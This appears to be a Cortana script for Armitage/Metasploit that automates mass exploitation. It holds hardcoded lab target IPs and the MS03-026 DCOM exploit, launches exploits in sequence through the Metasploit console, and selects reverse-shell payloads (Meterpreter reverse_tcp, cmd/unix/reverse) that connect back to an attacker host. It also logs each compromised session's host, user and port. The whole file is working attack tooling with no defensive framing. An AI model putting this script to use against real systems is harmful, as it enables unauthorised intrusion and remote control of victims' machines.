command arguments {
   local('$counter @attacks $minBin');

   $counter = $1;
   @attacks = split(';', "172.16.221.133,windows/dcerpc/ms03_026_dcom,172.16.221.1,6.0;172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,6.0;");
   #@attacks = split(';', "$2");
   $minBin = $3;

   fire_event_local("prep_attacks", $counter, @attacks, $minBin);
}

on prep_attacks {
   local('@attacks @temp %num_exps $counter $i $j $k $z $bin $limit $host $rank $tempHost $numBins %h');
   
   $limit = $1;
   @temp = $2;
   $tempHost = "";
   $j = 0;
   $k = 0;

   $numBins = (6 - $3);

   for ($i = 0; $i < $limit; $i++, $k++) {
      $host = split(',', @temp[$i])[0];

      $rank = split(',', @temp[$i])[3];
      #println($tempHost . " vs " . $host);
      if ($tempHost eq "") {
         $tempHost = $host;
         for ($z = 0; $z <= $numBins; $z++) {
            %h[$tempHost][$z] = @();
         }
      }
      else if ($tempHost ne $host) {
         %num_exps[$temphost] = $counter;
         $tempHost = $host;
         $j++;
         $k = 0;
         for ($z = 0; $z <= $numBins; $z++) {
            %h[$tempHost][$z] = @();
         }
      }      
      
      $bin = determineBin($numBins, $rank);
      push(%h[$tempHost][$bin], @temp[$i]);
      %num_exps[$tempHost] += 1;

      #println("[" . $j . "][" . "$k" . "]");
      #@attacks[$j][$k] = @temp[$i];
      
   }

   println(%h);
   println(%num_exps);
   #fire_event_local("launch_attacks", @attacks);
   #fire_event_local("launch_attacks", %h, $numBins);
   quit();
}

sub determineBin {
   local('$i $t')

   $t = 6.0;
   for ($i = 0; $i <= $1; $i++) {
      if ($2 >= ($t - $i)) {
         return $i;
      }
   }
}

on launch_attacks {
   local('$attack @attacks $exploit $rhost $lhost $i $os $console $name $payload @hosts $numSessions');

   $console = console();
   cmd($console, "jobs -K");
   @attacks = $1;
   $payload = "";

   for ($i = 0; $i < size(@attacks); $i++) {
      foreach $attack (@attacks[$i]) {
         ($rhost, $name, $lhost) = split(',', $attack);

         if ($rhost in @hosts) {}
         else {
            push(@hosts, $rhost);
         }

         $os = split('/', $name)[0];
         $exploit = "exploit/" . $name;

         cmd($console, "use $exploit");
         cmd_set($console, %(RHOST => "$rhost", LHOST => "$lhost", TARGET => "0"));

         if ($payload eq "") {
            $payload = determinePayload($os);
         }

         if ($os ne "multi") {
            cmd($console, "set payload " . $payload);
         }

         cmd($console, "exploit -j");
      
         sleep(10000);
         cmd($console, "jobs -K");
         if (size(sessions()) > $numSessions) {
            $numSessions = size(sessions());
            break;
         }
      }
      $payload = "";
   }
   fire_event_local("sessionHandle", @hosts);
}

sub determinePayload {
   if ($1 == "windows") {
      return "windows/meterpreter/reverse_tcp";
   }
   return "cmd/unix/reverse";
}

on sessionHandle {
   local('$console %out @ids $flag $sessionNum $host $user %r $exploit $type @hosts $port');
   
   @ids = session_ids();
   %out = sessions();
   $flag = "true";
   $console = console();
   @hosts = $1;

   cmd($console, "jobs -K");   

   foreach $sessionNum (@ids) {
   	%r = %out[$sessionNum];
   	$host = %r["host"];
   	$user = %r["username"];
   	$exploit = split('/', %r["via_exploit"], 2)[1];
      $type = %r["type"];
      $port = %r["session_port"];

      if ($host in @hosts) {
         remove(@hosts, $host);
      }

   	println("$host" . "," . "$flag" . "," . "$sessionNum" . "," . "$user" . "," . "$exploit" . "," . "$type" . "," . "$port");
   }

   fire_event_local("noSessions", @hosts);
}

on noSessions {
   local('$host @hosts');
   @hosts = $1;

   foreach $host (@hosts) {
      println("$host" . ",false,0,0,0,0,0");
   }
   quit();
}